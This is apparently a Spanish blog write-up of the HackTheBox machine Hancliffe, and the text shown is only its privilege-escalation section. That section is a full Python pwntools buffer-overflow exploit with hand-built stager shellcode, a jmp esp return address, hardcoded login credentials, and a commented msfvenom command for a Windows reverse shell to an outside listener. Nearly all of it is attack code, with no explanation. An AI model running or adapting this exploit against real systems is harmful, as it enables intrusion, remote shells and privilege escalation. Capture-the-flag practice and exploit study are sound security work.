---
layout: post
title: HackTheBox-Hancliffe
description: Resolucion de la maquina Hancliffe de HackTheBox
date: 2026-01-10 20:24:59 -500
categories: [Active Directory]
tags: [Ciberseguridad, Windows]
home_image: logo
logo:
  path: /assets/writeups/hancliffe.png
  alt: "Hancliffe"
---

## Escalada de privilegios (BOF)

```shell
#!/usr/bin/python3

from pwn import *
import sys, signal, time

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 2:
    print("\n[!] Uso: python3 %s <port>\n" % sys.argv[0])
    sys.exit(1)

port = sys.argv[1]

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.105 LPORT=443 -b "\x00" EXITFUNC=thread -f py
buf = b""

recv = b""                                       
recv += b"\x54"                                  # push esp
recv += b"\x58"                                  # pop eax
recv += b"\x66\x05\x90\x01"                      # add ax, 0x190
recv += b"\x66\x2d\x48\x01"                      # sub ax, 0x148
recv += b"\x8b\x30"                              # mov esi, dword [eax]
recv += b"\x83\xec\x64"                          # sub esp, 0x64
recv += b"\x31\xdb"                              # xor ebx, ebx 
recv += b"\x53"                                  # push ebx
recv += b"\x66\x81\xc3\x01\x04"                  # add bx, 0x401
recv += b"\x53"                                  # push ebx
recv += b"\x54"                                  # push esp
recv += b"\x5b"                                  # pop ebx
recv += b"\x66\x83\xc3\x64"                      # add bx, 0x64
recv += b"\x53"                                  # push ebx
recv += b"\x56"                                  # push esi

#call recv
recv += b"\xa1\xac\x82\x90\x71"                  # mov eax, [0x719082ac]
recv += b"\xff\xd0"                              # call eax 


offset = 66 - len(recv)
junk = recv + b"\x90" * offset 
jmp_esp = p32(0x7190239F)
jmp_esp70 = b"\xEB\xB8"                          # jmp $-70

payload = junk + jmp_esp + jmp_esp70

r = remote('192.168.1.37', port)
r.recvuntil(b"Username: ")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password: ")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName: ")
r.sendline(b"0xdf")
r.recvuntil(b"Input Your Code: ")
r.sendline(payload)
time.sleep(1)
r.send(buf)
```